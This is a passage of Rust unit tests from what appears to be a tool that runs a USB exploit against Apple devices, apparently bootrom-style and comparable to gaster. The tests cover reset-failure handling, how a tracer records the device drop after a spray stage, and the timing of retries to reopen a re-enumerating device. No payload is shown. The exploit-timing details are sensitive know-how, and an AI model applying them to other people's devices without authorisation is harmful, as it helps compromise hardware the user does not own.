            reset_gate(ResetEvidence::DriverCannotReset, false),
            ResetGate::Stop
        );

        assert_eq!(
            reset_failure_disposition(-5, false),
            ResetDisposition::KnownDrop,
            "LIBUSB_ERROR_NOT_FOUND: the known drop"
        );
        assert_eq!(
            reset_failure_disposition(-4, false),
            ResetDisposition::KnownDrop,
            "LIBUSB_ERROR_NO_DEVICE: the same situation one layer out"
        );
        assert_eq!(
            reset_failure_disposition(-7, false),
            ResetDisposition::Stop,
            "a timeout with the device present is a refusal"
        );

        for rc in [-1, -2, -3, -6, -7, -8, -9, -10, -11, -12, -99] {
            assert_eq!(
                reset_failure_disposition(rc, true),
                ResetDisposition::StopOverridden,
                "{rc}"
            );
        }
        assert_eq!(reset_gate(ResetEvidence::Refuted, true), ResetGate::ContinueLoudly);
        assert_eq!(
            reset_gate(ResetEvidence::DriverCannotReset, true),
            ResetGate::ContinueLoudly
        );
        // The override never turns a delivered reset into anything else.
        assert_eq!(reset_gate(ResetEvidence::Delivered, true), ResetGate::Continue);
    }

    /// The drop is recorded as **its own evidence**, and cannot be counted as an
    /// unattributed reset: a bare `kind::RESET` with no evidence is exactly what
    /// `Counters::resets_unrecorded` feeds to the `RESET_NOT_DELIVERED` verdict,
    /// which would blame the host for the exploit's own drop.
    #[test]
    fn the_known_drop_is_its_own_evidence_and_never_an_unrecorded_reset() {
        assert_ne!(
            KIND_RESET_AFTER_DROP,
            kind::RESET,
            "the drop must not use the bare reset kind"
        );

        let mut drop_tracer = Tracer::new(None, false).expect("a tracer with no sink");
        drop_tracer.event(
            KIND_RESET_AFTER_DROP,
            Some(Stage::Reset),
            "when=post-stage after=SPRAY: the reset call failed because the device was ABSENT \
             (rc=-5, 2 us)",
        );
        let c = drop_tracer.counters();
        assert_eq!(
            c.resets_attempted, 0,
            "the known drop is not an attempted reset"
        );
        assert_eq!(
            c.resets_unrecorded(),
            0,
            "the known drop must never read as an unrecorded reset"
        );
        assert_eq!(c.total(), 0, "and it is not a transfer");

        // Control: the same sentence under `kind::RESET` WOULD be counted as an
        // unrecorded attempt — which is the defect this separation prevents.
        let mut bare_tracer = Tracer::new(None, false).expect("a tracer with no sink");
        bare_tracer.event(
            kind::RESET,
            Some(Stage::Reset),
            "the reset call failed: LIBUSB_ERROR_NOT_FOUND (-5)",
        );
        let b = bare_tracer.counters();
        assert_eq!(b.resets_attempted, 1, "the control does count");
        assert_eq!(
            b.resets_unrecorded(),
            1,
            "the control is why the drop must not use kind::RESET"
        );
    }

    /// E5-3, pinned: the wait for a re-enumerating device is bounded by a
    /// **duration**, with an attempt cap only as a spin guard — and the recorded
    /// line carries the wall-clock absence, because an attempt count is not a
    /// duration (LINUX-HANDOFF §4.8: "19 attempts" was 285-292 ms).
    #[test]
    fn open_retry_is_bounded_by_wall_clock_not_attempts() {
        assert!(open_retry_allowed(Duration::ZERO, 0));
        assert!(open_retry_allowed(OPEN_RETRY_BUDGET - Duration::from_micros(1), 0));
        assert!(
            !open_retry_allowed(OPEN_RETRY_BUDGET, 0),
            "the budget is the bound, and it is exclusive"
        );
        assert!(!open_retry_allowed(OPEN_RETRY_BUDGET + Duration::from_secs(60), 0));
        assert!(
            !open_retry_allowed(Duration::ZERO, OPEN_RETRY_TRIES),
            "the attempt cap is a spin guard"
        );
        assert!(open_retry_allowed(Duration::ZERO, OPEN_RETRY_TRIES - 1));
        assert!(
            OPEN_RETRY_BUDGET > Duration::from_millis(435),
            "the budget must exceed the MEASURED 435 ms post-CLR_STATUS return"
        );

        let ok = open_retry_ok_note(3, Duration::from_millis(435));
        assert!(ok.contains("attempt 3"), "{ok}");
        assert!(ok.contains("435.000 ms"), "{ok}");
        assert!(ok.contains("wall-clock"), "{ok}");
        assert!(ok.contains("gaster waits forever"), "{ok}");

        let gone = open_retry_exhausted_note(
            Duration::from_millis(3_001),
            612,
            "no Apple device among 40 USB device(s)",
        );
        assert!(gone.contains("3001 ms"), "{gone}");
        assert!(gone.contains("612 open attempt"), "{gone}");
        assert!(gone.contains("40 USB device"), "{gone}");
        assert!(
            gone.contains("budget"),
            "the reader must see which bound expired: {gone}"
        );
    }

    /// The pause rule, whole domain — and the property that matters: however the
    /// operator configures `--usb-timeout-ms`, the budget admits MANY attempts,
    /// not one. MEASURED defect (reviewer, 2026-10-03): with 5000 ms the old
    /// pause crossed the whole 3 s budget in a single sleep, so the loop made
    /// exactly one attempt and the 435 ms re-enumeration could never be caught.
    #[test]
    fn open_retry_pause_pins_the_whole_domain() {
        assert_eq!(
            open_retry_pause(Duration::from_millis(5), Duration::ZERO),
            Duration::from_millis(5),
            "the default interval is honoured as configured"
        );
        assert_eq!(open_retry_pause(Duration::ZERO, Duration::ZERO), Duration::ZERO);
        assert_eq!(
            open_retry_pause(Duration::from_millis(5_000), Duration::ZERO),
            OPEN_RETRY_MAX_PAUSE,
            "a slow configured timeout must not consume the budget in one sleep"
        );
        assert_eq!(
            open_retry_pause(
                Duration::from_millis(5_000),
                OPEN_RETRY_BUDGET - Duration::from_millis(20)
            ),
            Duration::from_millis(20),
            "never past the budget"
        );
        assert_eq!(
            open_retry_pause(Duration::from_millis(5), OPEN_RETRY_BUDGET),
            Duration::ZERO
        );
        assert_eq!(
            open_retry_pause(
                Duration::from_millis(5),
                OPEN_RETRY_BUDGET + Duration::from_secs(1)
            ),
            Duration::ZERO
        );

        // The property, simulated over the real predicate: at least 60 attempts
        // inside the budget for every interval the option can be set to.
        for configured_ms in [0u64, 1, 5, 50, 500, 3_000, 5_000, 60_000] {
            let configured = Duration::from_millis(configured_ms);
            let mut elapsed = Duration::ZERO;
            let mut attempts = 0u32;
            while open_retry_allowed(elapsed, attempts) {
                attempts += 1;
                elapsed += open_retry_pause(configured, elapsed);
            }
            assert!(
                attempts >= 60,
                "--usb-timeout-ms {configured_ms} yields only {attempts} attempt(s) inside \
                 {OPEN_RETRY_BUDGET:?}; the 435 ms re-enumeration must be catchable"
            );
        }
    }
}
